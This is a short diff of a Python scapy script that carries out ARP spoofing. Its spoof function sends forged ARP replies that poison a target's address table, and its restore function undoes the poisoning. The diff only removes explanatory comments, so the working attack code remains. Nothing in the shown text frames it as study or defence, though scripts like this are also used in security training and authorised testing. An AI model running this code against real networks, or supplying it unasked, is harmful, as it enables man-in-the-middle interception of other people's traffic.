@@ -19,11 +19,9 @@ def spoof(target_ip, spoof_ip):
 	target_mac = get_mac(target_ip)
 	if not target_mac:
 		return
-	# Build an Ethernet frame and ARP reply (is-at)
 	arp = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
 	ether = scapy.Ether(dst=target_mac)
 	packet = ether/arp
-	# send layer-2 frame
 	scapy.sendp(packet, verbose=False)
 
 
@@ -36,7 +34,6 @@ def restore(destination_ip, source_ip):
 	arp = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destination_mac, hwsrc=source_mac)
 	ether = scapy.Ether(dst=destination_mac)
 	packet = ether/arp
-	# send multiple times to ensure the table is corrected
 	scapy.sendp(packet, count=5, verbose=False)
 
 
